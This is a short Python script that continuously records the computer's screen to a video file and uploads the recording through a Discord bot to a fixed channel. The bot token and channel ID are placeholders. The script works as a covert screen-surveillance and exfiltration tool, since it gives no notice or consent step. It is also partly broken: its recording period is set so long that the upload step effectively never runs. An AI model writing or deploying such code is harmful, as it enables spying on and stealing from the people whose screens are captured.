import cv2
import pyautogui
import numpy as np
import time
import discord
import asyncio


TOKEN = 'NUH-UH'
CHANNEL_ID = 69420

screen_width, screen_height = pyautogui.size()

fourcc = cv2.VideoWriter_fourcc(*'XVID')
out = cv2.VideoWriter('output.avi', fourcc, 20.0, (screen_width, screen_height))

record_duration = 100000000000
start_time = time.time()
intents = discord.Intents.default()

client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    await record_and_send()


async def send_video():
    with open('output.avi', 'rb') as f:
        video = discord.File(f)
        channel = client.get_channel(CHANNEL_ID)
        await channel.send(file=video)
    print('Video Sent to Discord')
    await channel.send('Video Sent to Discord')


async def record_and_send():
    global start_time
    while True:
        while time.time() - start_time < record_duration:
            
            screenshot = pyautogui.screenshot()

            frame = np.array(screenshot)

            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

            out.write(frame)

            await asyncio.sleep(0.1)

        await send_video()

        start_time = time.time()


client.run(TOKEN)
